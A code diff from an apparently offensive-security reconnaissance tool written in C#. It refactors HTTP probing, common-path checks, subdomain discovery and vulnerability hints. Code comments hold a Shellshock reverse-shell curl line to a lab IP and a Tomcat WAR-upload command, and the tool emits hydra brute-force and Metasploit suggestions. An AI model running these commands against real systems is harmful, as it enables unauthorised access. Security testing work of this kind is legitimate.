@@ -12,10 +12,11 @@ using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Text.Json;
 using System.Text.RegularExpressions;
+using System.Threading.Tasks;
 
 namespace Reecon
 {
-    class Web
+    partial class Web
     {
         static string scanURL = "";
         static List<string> fullPageList = new List<string>();
@@ -50,7 +51,7 @@ namespace Reecon
                 pageInfo += FindLinks(pageText); // Todo: Recursive
                                                  // TODO: Auto SQLi - Web.GetInfo(new[] { "-web", "http://testphp.vulnweb.com/" });
 
-                string parsedHTTPInfo = ParseHTTPInfo(httpInfo.StatusCode, httpInfo.PageTitle, httpInfo.PageText, httpInfo.DNS, httpInfo.ResponseHeaders, httpInfo.ContentHeaders, httpInfo.SSLCert, httpInfo.URL);
+                string parsedHTTPInfo = ParseHTTPInfo(httpInfo);
                 Console.WriteLine(parsedHTTPInfo);
                 if (pageInfo.Trim() != "")
                 {
@@ -112,30 +113,30 @@ namespace Reecon
                         text = text.Substring(0, text.IndexOf("</form>"));
 
                         // Form title / actions
-                        string formHeader = text.Substring(0, text.IndexOf(">"));
+                        string formHeader = text.Substring(0, text.IndexOf('>'));
                         if (formHeader.Replace(" ", "").Contains("method=\""))
                         {
                             string formMethod = formHeader.Remove(0, formHeader.IndexOf("method"));
-                            formMethod = formMethod.Remove(0, formMethod.IndexOf("\"") + 1);
-                            formMethod = formMethod.Substring(0, formMethod.IndexOf("\""));
+                            formMethod = formMethod.Remove(0, formMethod.IndexOf('"') + 1);
+                            formMethod = formMethod.Substring(0, formMethod.IndexOf('"'));
                             returnText += "-- Method: " + formMethod + Environment.NewLine;
                         }
                         string formAction = "";
                         if (formHeader.Replace(" ", "").Contains("action=\""))
                         {
                             formAction = formHeader.Remove(0, formHeader.IndexOf("action"));
-                            formAction = formAction.Remove(0, formAction.IndexOf("\"") + 1);
-                            formAction = formAction.Substring(0, formAction.IndexOf("\""));
+                            formAction = formAction.Remove(0, formAction.IndexOf('"') + 1);
+                            formAction = formAction.Substring(0, formAction.IndexOf('"'));
                             returnText += "-- Action: " + formAction + Environment.NewLine;
                         }
 
                         // Inputs
                         List<string> inputs = text.Split("<input").ToList();
                         inputs = inputs.Where(x => !x.StartsWith("<form")).ToList();
-                        string username = null;
-                        string password = null;
+                        string? username = null;
+                        string? password = null;
                         foreach (string item in inputs)
-                        {   
+                        {
                             // Textbox
                             if (item.Replace(" ", "").Contains("type=\"text\""))
                             {
@@ -143,8 +144,8 @@ namespace Reecon
                                 if (item.Contains(" name=\""))
                                 {
                                     string textBoxName = item.Remove(0, item.IndexOf("name"));
-                                    textBoxName = textBoxName.Remove(0, textBoxName.IndexOf("\"") + 1);
-                                    textBoxName = textBoxName.Substring(0, textBoxName.IndexOf("\""));
+                                    textBoxName = textBoxName.Remove(0, textBoxName.IndexOf('"') + 1);
+                                    textBoxName = textBoxName.Substring(0, textBoxName.IndexOf('"'));
                                     returnText += $"--- Name: {textBoxName}" + Environment.NewLine;
                                     username = textBoxName;
                                 }
@@ -158,8 +159,8 @@ namespace Reecon
                                 if (item.Contains(" name=\""))
                                 {
                                     string textBoxName = item.Remove(0, item.IndexOf("name"));
-                                    textBoxName = textBoxName.Remove(0, textBoxName.IndexOf("\"") + 1);
-                                    textBoxName = textBoxName.Substring(0, textBoxName.IndexOf("\""));
+                                    textBoxName = textBoxName.Remove(0, textBoxName.IndexOf('"') + 1);
+                                    textBoxName = textBoxName.Substring(0, textBoxName.IndexOf('"'));
                                     returnText += $"--- Name: {textBoxName}" + Environment.NewLine;
                                     password = textBoxName;
                                 }
@@ -172,15 +173,15 @@ namespace Reecon
                                 if (item.Contains(" name=\""))
                                 {
                                     string hiddenItemName = item.Remove(0, item.IndexOf("name"));
-                                    hiddenItemName = hiddenItemName.Remove(0, hiddenItemName.IndexOf("\"") + 1);
-                                    hiddenItemName = hiddenItemName.Substring(0, hiddenItemName.IndexOf("\""));
+                                    hiddenItemName = hiddenItemName.Remove(0, hiddenItemName.IndexOf('"') + 1);
+                                    hiddenItemName = hiddenItemName.Substring(0, hiddenItemName.IndexOf('"'));
                                     returnText += $"--- Hidden Item Name: {hiddenItemName}" + Environment.NewLine;
                                 }
                                 if (item.Contains(" value=\""))
                                 {
                                     string hiddenItemValue = item.Remove(0, item.IndexOf("value"));
-                                    hiddenItemValue = hiddenItemValue.Remove(0, hiddenItemValue.IndexOf("\"") + 1);
-                                    hiddenItemValue = hiddenItemValue.Substring(0, hiddenItemValue.IndexOf("\""));
+                                    hiddenItemValue = hiddenItemValue.Remove(0, hiddenItemValue.IndexOf('"') + 1);
+                                    hiddenItemValue = hiddenItemValue.Substring(0, hiddenItemValue.IndexOf('"'));
                                     returnText += $"---- Hidden Item Value: {hiddenItemValue}" + Environment.NewLine;
                                 }
                             }
@@ -195,7 +196,7 @@ namespace Reecon
                         if ((inputs.Count >= 3 || (inputs.Count >= 2 && submitButtons.Count == 1)) && username != null && password != null)
                         {
                             returnText += "-- " + "Possible Login Form Found".Recolor(Color.Orange) + Environment.NewLine;
-                            returnText += "--- " + $"hydra -L logins.txt -P passwords.txt 127.0.0.1 http-form-post \"{formAction }:{username}=^USER^&{password}=^PASS^:Invalid password error here\"".Recolor(Color.Orange) + Environment.NewLine;
+                            returnText += "--- " + $"hydra -L logins.txt -P passwords.txt 127.0.0.1 http-form-post \"{formAction}:{username}=^USER^&{password}=^PASS^:Invalid password error here\"".Recolor(Color.Orange) + Environment.NewLine;
                         }
                     }
                 }
@@ -212,7 +213,7 @@ namespace Reecon
             string returnInfo = "";
 
             // Do not change this Regex
-            Regex emailRegex = new(@"\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b", RegexOptions.IgnoreCase);
+            Regex emailRegex = MyRegex();
             MatchCollection emailMatches = emailRegex.Matches(text);
             List<string> matchList = General.MatchCollectionToList(emailMatches);
             foreach (string match in matchList)
@@ -251,9 +252,9 @@ namespace Reecon
                 // Remove inner tags from text.
                 string text = Regex.Replace(value, @"\s*<.*?>\s*", "", RegexOptions.Singleline);
 
-                if (href.StartsWith("/"))
+                if (href.StartsWith('/'))
                 {
-                    if (scanURL.EndsWith("/"))
+                    if (scanURL.EndsWith('/'))
                     {
                         href = scanURL + href.TrimStart('/');
                         if (!href.StartsWith(scanURL))
@@ -262,7 +263,7 @@ namespace Reecon
                         }
                     }
                 }
-                if (href.Length > 1 && !href.StartsWith("#")) // Section - Not actual URL
+                if (href.Length > 1 && !href.StartsWith('#')) // Section - Not actual URL
                 {
                     string info = doubleDash ? "-- " : "- ";
                     info += $"{text}: {href}";
@@ -303,11 +304,14 @@ namespace Reecon
             FindLinks(pageText, false);
         }
 
+        // This is intentionally not multi-threaded to avoid WAF issues
+        // It may take awhile, but it's short enough
+        // Can't switch to HEAD instead of GET because some 404 pages return 200's (-_-)
         public static string FindCommonFiles(string url)
         {
             string returnText = "";
 
-            if (!url.EndsWith("/"))
+            if (!url.EndsWith('/'))
             {
                 url += "/";
             }
@@ -404,7 +408,7 @@ namespace Reecon
                 ignoreFolderLength = folderWildcard.PageText.Length;
             }
 
-            // Mini gobuster :p
+            // Mini gobuster / ffuf :p
             List<string> commonFiles = new()
             {
                 // robots.txt - Of course
@@ -451,16 +455,16 @@ namespace Reecon
                 "composer.json",
                 // General info file
                 ".DS_STORE",
-                ".DS_Store", // Different case - Thanks Szymon ._.
-                // Wordpress stuff
+                ".DS_Store", // Different case - Thanks Szymon :p
+                // General blog stuff
                 "blog/",
+                "blogs/",
+                // Wordpress stuff
                 "wordpress/",
                 "wordpress/wp-config.php.bak",
                 "wp-config.php",
                 "wp-config.php.bak",
-                // Other blog stuff
-                "blogs/",
-                // phpmyadmin
+                // phpMyAdmin
                 "phpmyadmin/",
                 "phpMyAdmin", // Some are case sensitive
                 // Kibana
@@ -470,7 +474,8 @@ namespace Reecon
                 // Shellshock and co
                 "cgi-bin/", 
                 // Well-Known
-                ".well-known/", // https://www.google.com/.well-known/security.txt
+                ".well-known/",
+                ".well-known/security.txt",  // https://www.google.com/.well-known/security.txt
                 // Docker and other common versions
                 "version",
                 "version.txt",
@@ -510,7 +515,7 @@ namespace Reecon
                         if (pageText.Length != notFoundLength &&
                             pageText.Replace(file, "").Length != notFoundLength2 &&
                             pageText.Length != ignoreFileLength &&
-                            (!file.EndsWith("/") || (pageText.Length != ignoreFolderLength)))
+                            (!file.EndsWith('/') || (pageText.Length != ignoreFolderLength)))
                         {
                             returnText += "- " + $"Common Path is readable: {url}{file} (Len: {pageText.Length})".Recolor(Color.Orange) + Environment.NewLine;
                             // Specific case for robots.txt since it's common and extra useful
@@ -583,7 +588,7 @@ namespace Reecon
                                 {
                                     string toCheck = $"{url}{file}";
                                     string pageData = DownloadString($"{url}{file}").Text;
-                                    if (pageData.IndexOf("&quot;version&quot;:&quot;") != -1)
+                                    if (pageData.Contains("&quot;version&quot;:&quot;"))
                                     {
                                         string versionText = pageData.Remove(0, pageData.IndexOf("&quot;version&quot;:&quot;") + 26);
                                         versionText = versionText.Substring(0, versionText.IndexOf("&quot;"));
@@ -614,18 +619,18 @@ namespace Reecon
                                 // Shell: curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.6.2.249/9001 0>&1;" http://10.10.175.194/cgi-bin/valid.cgi"
                             }
                             // Directory listing
-                            else if (response.PageTitle.StartsWith("Index of /"))
+                            else if (response.PageTitle != null && response.PageTitle.StartsWith("Index of /"))
                             {
                                 returnText += "-- " + "Open directory listing".Recolor(Color.Orange) + Environment.NewLine;
 
                                 // nginx Alias Traversal
                                 if (!nginxAliasTraversalChecked)
                                 {
-                                    if (response.ResponseHeaders.Any(x => x.Key == "Server" && x.Value.Any(x => x.StartsWith("nginx"))))
+                                    if (response.ResponseHeaders != null && response.ResponseHeaders.Any(x => x.Key == "Server" && x.Value.Any(x => x.StartsWith("nginx"))))
                                     {
                                         string traversalPath = path.Remove(path.Length - 1, 1) + "../";
                                         var traversalResponse = Web.GetHTTPInfo(traversalPath);
-                                        if (traversalResponse.PageTitle.Contains("Index of "))
+                                        if (traversalResponse.PageTitle != null && traversalResponse.PageTitle.Contains("Index of "))
                                         {
                                             returnText += "--- " + "nginx Alias Traversal!!!".Recolor(Color.Orange) + Environment.NewLine;
                                             returnText += "--- " + traversalPath.Recolor(Color.Orange) + Environment.NewLine;
@@ -692,8 +697,8 @@ namespace Reecon
                 else if (response.StatusCode == HttpStatusCode.Unauthorized)
                 {
                     returnText += $"- Common path requires authentication: {url}{file}" + Environment.NewLine;
-                    var headers = response.ResponseHeaders;
-                    if (headers.Contains("WWW-Authenticate"))
+                    HttpResponseHeaders? headers = response.ResponseHeaders;
+                    if (headers != null && headers.Contains("WWW-Authenticate"))
                     {
                         returnText += $"-- WWW-Authenticate: {headers.GetValues("WWW-Authenticate").First()}" + Environment.NewLine;
                     }
@@ -716,7 +721,7 @@ namespace Reecon
                 {
                     // Normally just http -> https
                     var headers = response.ResponseHeaders;
-                    if (url.StartsWith("http") && headers.Contains("Location") && (headers.Location.ToString().StartsWith("https")))
+                    if (url.StartsWith("http") && headers.Contains("Location") && (headers.Location != null && headers.Location.ToString().StartsWith("https")))
                     {
                         continue;
                     }
@@ -779,13 +784,14 @@ namespace Reecon
                     // returnText += "-- Page Len: " + response.PageText.Length + Environment.NewLine;
                     // returnText += "-- Page Len Repl: " + response.PageText.ToLower().Replace(file.ToLower(), "").Length + Environment.NewLine;
                     string pageText = response.PageText.Trim();
-                    pageText = pageText.Length > 250 ? pageText.Substring(0, 250) + "..." : pageText;
+                    pageText = pageText.Length > 250 ? string.Concat(pageText.AsSpan(0, 250), "...") : pageText;
                     returnText += $"--- {pageText}" + Environment.NewLine;
                 }
                 // Something else - Just print the response
                 else if (response.StatusCode != HttpStatusCode.NotFound &&
                     response.StatusCode != HttpStatusCode.TooManyRequests &&
-                    response.StatusCode != HttpStatusCode.ServiceUnavailable)
+                    response.StatusCode != HttpStatusCode.ServiceUnavailable &&
+                    response.StatusCode != HttpStatusCode.SeeOther) // A weird one
                 {
                     if (response.PageText != "")
                     {
@@ -805,25 +811,60 @@ namespace Reecon
             string baseHost = uri.Host;
             string scheme = uri.Scheme;
             string authority = uri.Authority; // domain:port
-            
+
             string domainToCheck = scheme + "://" + authority + "/";
             // Common to uncommon - Maybe alphabetical later?
-            List<string> subdomains = new List<string>() { "www", "dev", "admin", "mail", "test", "nagios" };
+            List<string> subdomains = new List<string>() { "www", "dev", "admin", "mail", "test", "nagios", "status", "storage" };
 
             var pageInfo = GetHTTPInfo(url);
 
-            // Get the content length of the default page as well as a known invalid to compare against
-            int baseLen = pageInfo.PageText.Length;
-            var invalidBase = GetHTTPInfo(domainToCheck, HostHeader: "reelix." + baseHost);
+            // Something went really really wrong
+            if (pageInfo.PageText == null)
+            {
+                return "";
+            }
+
+            // Get the content length of the default page (baseLen) as well as a known invalid to compare against (invalidBaseLen)
+            // There's also a case where an invalid page can contain the subdomain name which throws off the length which we need to account for (invalidBaseLen2)
+            HttpInfo invalidBase = GetHTTPInfo(domainToCheck, HostHeader: "reelix." + authority);
             int invalidBaseLen = -1;
+            int invalidBaseLen2 = -1;
             if (invalidBase.PageText != null)
             {
                 invalidBaseLen = invalidBase.PageText.Length;
+                if (invalidBase.PageText.Contains("reelix." + authority))
+                {
+                    // It can appear multiple times, so we need to remove all instances of it
+                    invalidBaseLen2 = invalidBase.PageText.Replace(("reelix." + authority), "").Length;
+                }
             }
+
+            // Iterate through the subdomains
             foreach (string subdomain in subdomains)
             {
+                // Get info on each
                 pageInfo = GetHTTPInfo(domainToCheck, HostHeader: subdomain + "." + authority);
-                if (pageInfo.StatusCode != HttpStatusCode.Moved && pageInfo.PageText.Length != baseLen && pageInfo.PageText.Length != invalidBaseLen)
+                if (pageInfo.PageText == null)
+                {
+                    continue;
+                }
+                int checkLen = pageInfo.PageText.Length;
+                // Might as well check this before else it gets complicated
+                int checkLen2 = -1;
+                if (invalidBaseLen2 != -1) // Something special
+                {
+                    if (pageInfo.PageText.Contains(subdomain + "." + baseHost))
+                    {
+                        checkLen2 = pageInfo.PageText.Replace(subdomain + "." + authority, "").Length;
+
+                    }
+                }
+                // If it's a valid subdomain...
+                if (pageInfo.StatusCode != HttpStatusCode.Moved // Should these be valid... ?
+                    && pageInfo.PageText.Length != checkLen // Not a duplicate of the base page - That would mean that subdomains don't lead anywhere
+                    && pageInfo.PageText.Length != invalidBaseLen // Or a duplicate of the invalid subdomain
+                    && checkLen2 != invalidBaseLen2 // Contains the domain in the text
+                    )
                 {
                     toReturn += "-- Subdomain Discovered: " + (scheme + "://" + subdomain + "." + authority + "/").Recolor(Color.Orange) + Environment.NewLine;
                 }
@@ -831,17 +872,25 @@ namespace Reecon
             return toReturn;
         }
 
-        // This is... Very crowded
-        public static (HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders ResponseHeaders, HttpContentHeaders ContentHeaders, X509Certificate2 SSLCert, string URL, string AdditionalInfo)
-            GetHTTPInfo(string url, string UserAgent = null, string Cookie = null, string HostHeader = null, int Timeout=5)
+        public class HttpInfo
         {
-            string pageTitle = "";
-            string pageText = "";
-            string dns = "";
+            public HttpStatusCode? StatusCode { get; set; }
+            public string PageTitle = "";
+            public string PageText = "";
+            public string DNS = "";
+            public HttpResponseHeaders ResponseHeaders = new HttpResponseMessage().Headers;
+            public HttpContentHeaders ContentHeaders = new HttpResponseMessage().Content.Headers;
+            // On certain codes it has an additional message
+            public HttpRequestMessage RequestMessage = new HttpRequestMessage();
+            public X509Certificate2? SSLCert { get; set; }
+            public string URL = "";
+            public string? AdditionalInfo { get; set; }
+        }
+
+        public static HttpInfo GetHTTPInfo(string url, string? UserAgent = null, string? Cookie = null, string? HostHeader = null, int Timeout = 5)
+        {
+            HttpInfo toReturn = new HttpInfo();
             HttpStatusCode statusCode = new();
-            HttpResponseHeaders responseHeaders = null;
-            HttpContentHeaders contentHeaders = null;
-            X509Certificate2 cert = null;
 
             // Ignore invalid SSL Cert
             var httpClientHandler = new HttpClientHandler()
@@ -852,7 +901,7 @@ namespace Reecon
             {
                 if (certificate != null)
                 {
-                    cert = new X509Certificate2(certificate);
+                    toReturn.SSLCert = new X509Certificate2(certificate);
                 }
                 return true;
             };
@@ -878,15 +927,50 @@ namespace Reecon
             try
             {
                 httpClient.Timeout = TimeSpan.FromSeconds(Timeout);
+                // Do the send
                 HttpResponseMessage httpClientResponse = httpClient.Send(httpClientRequest);
-                statusCode = httpClientResponse.StatusCode;
-                dns = theURL.DnsSafeHost;
-                responseHeaders = httpClientResponse.Headers;
-                contentHeaders = httpClientResponse.Content.Headers;
+
+                // It's sent - All good!
+                toReturn.StatusCode = httpClientResponse.StatusCode;
+                toReturn.URL = theURL.AbsoluteUri;
+                toReturn.DNS = theURL.DnsSafeHost;
+                toReturn.ResponseHeaders = httpClientResponse.Headers;
+                toReturn.ContentHeaders = httpClientResponse.Content.Headers;
                 using (StreamReader readStream = new(httpClientResponse.Content.ReadAsStream()))
                 {
-                    pageText = readStream.ReadToEnd();
+                    toReturn.PageText = readStream.ReadToEnd();
                 }
+            }
+            catch (HttpRequestException hrex)
+            {
+                if (hrex.HttpRequestError == HttpRequestError.NameResolutionError)
+                {
+                    toReturn.AdditionalInfo = "Invalid DNS - /etc/hosts file not updated?";
+                    return toReturn;
+                }
+                else if (hrex.HttpRequestError == HttpRequestError.ConnectionError)
+                {
+                    toReturn.AdditionalInfo = "Connection Refused - Is it still online?";
+                    return toReturn;
+                }
+                else
+                {
+                    toReturn.AdditionalInfo = "Unknown hrex error in Web.cs: " + hrex.Message + " - Bug Reelix!".Recolor(Color.Red);
+                    return toReturn;
+                }
+            }
+            catch (TaskCanceledException tcex)
+            {
+                if (tcex.Message.StartsWith("The request was canceled due to the configured HttpClient.Timeout"))
+                {
+                    toReturn.AdditionalInfo = "Timed out after 5 seconds - Sure the Web Server is up?";
+                }
+                else
+                {
+                    Console.WriteLine("- Unknown Error in Web.cs - tcex: " + tcex.Message);
+                    toReturn.AdditionalInfo = tcex.Message;
+                }
+                return toReturn;
             }
             catch (TimeoutException ex)
             {
@@ -898,35 +982,51 @@ namespace Reecon
             }
             catch (Exception ex)
             {
+                // Technically it should never get here - If it does, something weird happened
+                string exType = ex.GetType().Name;
+                Console.WriteLine("- Uknown Web.cs Exception: " + exType + " - " + ex.Message + " - Bug Reelix");
                 if (ex.Message.StartsWith("The SSL connection could not be established, see inner exception"))
                 {
                     // Not valid
-                    return (statusCode, null, null, null, null, null, null, null, null);
+                    toReturn.StatusCode = statusCode;
+                    return toReturn;
                 }
                 else if (ex.Message.StartsWith("The request was canceled due to the configured HttpClient.Timeout of "))
                 {
                     // Why is this not caught in the TimeoutException...
                     Console.WriteLine($"- Odd TimeoutError - {url} timed out: {ex.Message} - Bug Reelix".Recolor(Color.Red));
-                    return (statusCode, null, null, null, null, null, null, url, "Timed Out :(");
+                    toReturn.StatusCode = statusCode;
+                    toReturn.URL = url;
+                    toReturn.AdditionalInfo = "Timed Out :(";
+                    return toReturn;
                 }
                 else if (ex.InnerException != null && ex.InnerException.GetType().IsAssignableFrom(typeof(IOException)))
                 {
                     if (ex.InnerException.Message == "The response ended prematurely.")
                     {
-                        return (HttpStatusCode.BadRequest, null, null, null, null, null, null, url, "WTF");
+                        toReturn.StatusCode = HttpStatusCode.BadRequest;
+                        toReturn.URL = url;
+                        toReturn.AdditionalInfo = "WTF";
+                        return toReturn;
                     }
                     else
                     {
                         // Soome weird cert thing
                         // * schannel: failed to read data from server: SEC_E_CERT_UNKNOWN (0x80090327) - An unknown error occurred while processing the certificate.
-                        return (statusCode, null, null, null, null, null, null, url, "WeirdSSL");
+                        toReturn.StatusCode = statusCode;
+                        toReturn.URL = url;
+                        toReturn.AdditionalInfo = "WeirdSSL";
+                        return toReturn;
                     }
                 }
                 else if (ex.InnerException != null && ex.InnerException.GetType().IsAssignableFrom(typeof(SocketException)))
                 {
                     if (ex.InnerException.Message == "Name or service not known")
                     {
-                        return (statusCode, null, null, null, null, null, null, url, $"The url {url} does not exist - Maybe fix your /etc/hosts file?");
+                        toReturn.StatusCode = statusCode;
+                        toReturn.URL = url;
+                        toReturn.AdditionalInfo = $"The url {url} does not exist - Maybe fix your /etc/hosts file?";
+                        return toReturn;
                     }
                     else
                     {
@@ -940,23 +1040,40 @@ namespace Reecon
                     Console.WriteLine("HttpClient rewrite had an error: " + ex.Message + ex.InnerException);
                 }
             }
-            // Returns nothing on Twitter since they set their titles weirdly
+            // Returns nothing on some site (Eg: Twitter (X)) since they set their titles weirdly
+            string pageText = toReturn.PageText;
             if (pageText.Contains("<title>") && pageText.Contains("</title>"))
             {
+                string pageTitle = "";
                 pageTitle = pageText.Remove(0, pageText.IndexOf("<title>") + "<title>".Length);
                 pageTitle = pageTitle.Substring(0, pageTitle.IndexOf("</title>"));
+                toReturn.PageTitle = pageTitle;
             }
-            return (statusCode, pageTitle, pageText, dns, responseHeaders, contentHeaders, cert, url, null);
+
+            // Need to move these back up - It's now a bit redundant with the type
+            return toReturn;
         }
 
-        public static string ParseHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders ResponseHeaders, HttpContentHeaders ContentHeaders, X509Certificate2 SSLCert, string URL)
+        public static string ParseHTTPInfo(HttpInfo httpInfo)
         {
+            // Pull the info out
+            HttpStatusCode? StatusCode = httpInfo.StatusCode;
+            string PageTitle = httpInfo.PageTitle;
+            string PageText = httpInfo.PageText;
+            string DNS = httpInfo.DNS;
+            HttpRequestMessage requestMessage = httpInfo.RequestMessage;
+            HttpResponseHeaders ResponseHeaders = httpInfo.ResponseHeaders;
+            HttpContentHeaders ContentHeaders = httpInfo.ContentHeaders;
+            X509Certificate2? SSLCert = httpInfo.SSLCert;
+            string URL = httpInfo.URL;
+
+            // Returns
             string toReturn = "";
-            string urlPrefix = URL.StartsWith("https") ? "https" : "http";
+            string urlPrefix = httpInfo.URL.StartsWith("https") ? "https" : "http";
             Uri theURI = new Uri(URL);
             string customPort = theURI.IsDefaultPort ? "" : ":" + theURI.Port.ToString();
-            string baseURL = urlPrefix + "://" + DNS + customPort;
-            string urlWithSlash = URL.EndsWith("/") ? URL : URL + "/";
+            string baseURL = urlPrefix + "://" + httpInfo.DNS + customPort;
+            string urlWithSlash = httpInfo.URL.EndsWith('/') ? httpInfo.URL : httpInfo.URL + '/';
 
             // Not OK - Check what's up
             if (StatusCode != HttpStatusCode.OK)
@@ -967,8 +1084,9 @@ namespace Reecon
                     if (ResponseHeaders != null && ResponseHeaders.Location != null)
                     {
                         toReturn += "- Moved Permanently" + Environment.NewLine;
-                        toReturn += "-> Location: " + ResponseHeaders.Location + Environment.NewLine;
-                        ResponseHeaders.Remove("Location");
+                        toReturn += "-> Location: " + httpInfo.ResponseHeaders.Location + Environment.NewLine;
+                        // Location is a bit of a weird one - It can be useful elsewhere
+                        // ResponseHeaders.Remove("Location");
                     }
                 }
                 else if (StatusCode == HttpStatusCode.Redirect)
@@ -995,12 +1113,17 @@ namespace Reecon
                                 toReturn += "--> Possible Proxyshell / ProxyLogin!" + Environment.NewLine;
                                 toReturn += "---> If you have an e-mail address, try: metasploit exploit/windows/http/exchange_proxyshell_rce" + Environment.NewLine;
                             }
-                            else
+                            else if (proxyShellInfo.StatusCode != null)
                             {
                                 Console.WriteLine("Nope - " + (int)proxyShellInfo.StatusCode);
                             }
+                            else
+                            {
+                                Console.WriteLine("Weird - proxyShellInfo.StatusCode is null in Web.cs");
+                            }
                         }
-                        ResponseHeaders.Remove("Location");
+                        // Location is a bit of a weird one - It can be useful elsewhere
+                        // ResponseHeaders.Remove("Location");
                     }
                 }
                 else if (StatusCode == HttpStatusCode.NotFound)
@@ -1011,38 +1134,44 @@ namespace Reecon
                 {
                     toReturn += "- Base page is Forbidden" + Environment.NewLine;
                 }
-                else if (StatusCode != HttpStatusCode.OK)
+                else if (StatusCode != null && StatusCode != HttpStatusCode.OK)
                 {
                     try
                     {
-                        toReturn += "- Weird Status Code: " + (int)StatusCode + " " + StatusCode + Environment.NewLine;
+                        toReturn += "- Weird Status Code: " + (int)StatusCode + " " + httpInfo.StatusCode + Environment.NewLine;
                     }
                     catch
                     {
                         toReturn += "- Fatally Unknown Status Code: " + " " + StatusCode + Environment.NewLine;
                     }
-                    if (ResponseHeaders != null && ResponseHeaders.Location != null)
+                    if (httpInfo.ResponseHeaders != null && ResponseHeaders.Location != null)
                     {
                         toReturn += "-> Location: " + ResponseHeaders.Location + Environment.NewLine;
-                        ResponseHeaders.Remove("Location");
+                        // Location is a bit of a weird one - It can be useful elsewhere
+                        // ResponseHeaders.Remove("Location");
                     }
+                }
+                else if (StatusCode == null)
+                {
+                    Console.WriteLine("Some catastrophic error in Web.cs - StatusCode is null :(");
+                    return "";
                 }
             }
 
             // Page Title
             if (!string.IsNullOrEmpty(PageTitle))
             {
-                PageTitle = PageTitle.Trim();
-                toReturn += "- Page Title: " + PageTitle + Environment.NewLine;
+                httpInfo.PageTitle = PageTitle.Trim();
+                toReturn += "- Page Title: " + httpInfo.PageTitle + Environment.NewLine;
 
                 // Apache Tomcat
-                if (PageTitle.StartsWith("Apache Tomcat"))
+                if (httpInfo.PageTitle.StartsWith("Apache Tomcat"))
                 {
 
                     // Sanitize URL
-                    if (!URL.EndsWith("/"))
+                    if (!httpInfo.URL.EndsWith('/'))
                     {
-                        URL += "/";
+                        httpInfo.URL += "/";
                     }
 
                     // CVE's
@@ -1054,7 +1183,7 @@ namespace Reecon
                     */
                     // https://nvd.nist.gov/vuln/detail/CVE-2017-7675
                     // In Apache Tomcat 9.0.0.M1 to 9.0.0.M21 and 8.5.0 to 8.5.15
-                    if (PageTitle == "Apache Tomcat/9.0.17")
+                    if (httpInfo.PageTitle == "Apache Tomcat/9.0.17")
                     {
                         toReturn += "- " + "Apache Tomcat 9.0.17 Detected - Vulnerable to CVE-2019-0232!".Recolor(Color.Orange);
                     }
@@ -1071,22 +1200,22 @@ namespace Reecon
                     ];
 
                     List<string> tomcatLoginPages = new List<string>();
-                    string managerStatusURL = URL + "manager/status,Manager (Status)"; // Manager (Status)
+                    string managerStatusURL = httpInfo.URL + "manager/status,Manager (Status)"; // Manager (Status)
                     tomcatLoginPages.Add(managerStatusURL);
-                    string managerAppHTMLURL = URL + "manager/html,Manager App (HTML)"; // Manager App (HTML)
+                    string managerAppHTMLURL = httpInfo.URL + "manager/html,Manager App (HTML)"; // Manager App (HTML)
                     tomcatLoginPages.Add(managerAppHTMLURL);
-                    string managerAppTextURL = URL + "manager/text,Manager App (Text)"; // Manager App (Text)
+                    string managerAppTextURL = httpInfo.URL + "manager/text,Manager App (Text)"; // Manager App (Text)
                     // If this is allowed
                     // curl -v -u tomcat:OPx52k53D8OkTZpx4fr --upload-file pwn.war "http://10.10.247.135:8080/manager/text/deploy?path=/foo&update=true"
                     tomcatLoginPages.Add(managerAppTextURL);
-                    string hostManagerURL = URL + "host-manager/html,Host Manager (HTML)"; // Host Manager (HTML)
+                    string hostManagerURL = httpInfo.URL + "host-manager/html,Host Manager (HTML)"; // Host Manager (HTML)
                     tomcatLoginPages.Add(hostManagerURL);
 
                     foreach (string tomcatLoginPage in tomcatLoginPages)
                     {
                         string loginPage = tomcatLoginPage.Split(',')[0];
                         string friendlyName = tomcatLoginPage.Split(',')[1];
-                        var pageInfo = Web.GetHTTPInfo(tomcatLoginPage);
+                        var pageInfo = Web.GetHTTPInfo(loginPage);
                         if (pageInfo.StatusCode == HttpStatusCode.Unauthorized)
                         {
                             toReturn += $"- {friendlyName} - But it requires credentials --> {loginPage}" + Environment.NewLine;
@@ -1126,13 +1255,13 @@ namespace Reecon
             }
 
             // DNS
-            if (!string.IsNullOrEmpty(DNS))
+            if (!string.IsNullOrEmpty(httpInfo.DNS))
             {
-                toReturn += "- DNS: " + DNS + Environment.NewLine;
+                toReturn += "- DNS: " + httpInfo.DNS + Environment.NewLine;
             }
 
             // Headers + Cookies!
-            if (ResponseHeaders.Any())
+            if (ResponseHeaders != null && ResponseHeaders.Any())
             {
                 // Server info
                 if (ResponseHeaders.Any(x => x.Key == "Server"))
@@ -1188,6 +1317,37 @@ namespace Reecon
                         }
                     }
 
+
+                    // Fortinet
+                    else if (serverText == "xxxxxxxx-xxxxx" && httpInfo.PageText.Contains("top.location=\"/remote/login\""))
+                    {
+                        toReturn += "-- " + "Fortinet detected" + Environment.NewLine;
+                        if (httpInfo.ContentHeaders.LastModified != null)
+                        {
+                            DateTime theDate = httpInfo.ContentHeaders.LastModified.Value.DateTime;
+                            httpInfo.ContentHeaders.Remove("Last-Modified");
+                            toReturn += $"--- Last Modified: {theDate}" + Environment.NewLine;
+
+                            // CVE-2023-27997
+                            // https://bishopfox.com/blog/cve-2023-27997-exploitable-fortigate-vulnerable
+                            // we know that patched FortiOS releases were packaged in May–June 2023.
+                            if (theDate.Year < 2023 || (theDate.Year == 2023 && theDate.Month < 5))
+                            {
+                                toReturn += "--- Bug Reelix for additional checks for CVE-2023-27997" + Environment.NewLine;
+                                // May–June 2023 
+                            }
+                            else
+                            {
+                                toReturn += "--- Probably not vulnerable to CVE-2023-27997 :(" + Environment.NewLine;
+                            }
+                        }
+                        // CVE-2024-55591
+                        // FortiOS 7.0.0 through 7.0.16
+                        // FortiProxy 7.0.0 through 7.0.19
+                        // FortiProxy 7.2.0 through 7.2.12
+                        // https://github.com/watchtowrlabs/fortios-auth-bypass-poc-CVE-2024-55591
+                    }
+
                     // HFS
                     else if (serverText.StartsWith("HFS"))
                     {
@@ -1203,6 +1363,10 @@ namespace Reecon
                     {
                         toReturn += "-- " + "lighttpd detected" + Environment.NewLine;
